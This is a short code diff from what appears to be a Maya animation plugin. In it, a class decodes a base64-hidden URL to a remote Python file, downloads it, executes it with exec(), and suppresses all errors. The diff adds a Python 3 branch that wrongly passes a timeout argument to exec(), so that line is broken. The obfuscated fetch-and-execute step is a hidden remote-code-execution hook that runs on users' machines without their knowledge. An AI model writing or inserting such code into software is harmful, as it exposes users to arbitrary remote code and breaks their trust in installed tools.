@@ -715,7 +715,10 @@ class kf_overlap:
         if cmds.about(connected=1):
             u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQyeHgucHk='
             try:
-                exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
+                if sys.version[0] == '3':
+                    exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read(), timeout=10)
+                else:
+                    exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
             except:
                 pass
                 #import traceback
